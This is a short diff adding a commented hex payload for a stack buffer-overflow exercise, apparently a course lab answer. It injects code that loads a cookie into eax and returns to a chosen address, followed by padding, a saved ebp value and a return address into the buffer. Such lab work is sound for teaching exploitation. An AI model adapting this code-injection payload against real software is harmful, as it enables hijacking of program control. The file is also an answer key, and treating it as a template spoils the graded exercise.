@@ -1,0 +1,11 @@
+/* assign cookie to eax */
+b8 ab 74 87 4d      /* mov      $0x4d8774ab, %eax */
+68 81 8e 04 08      /* push     $8048e81 */
+c3                  /* ret */
+/* Padding required: 29 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00
+/* previous value of ebp */
+70 32 68 55
+/* head addr of buf */
+18 32 68 55
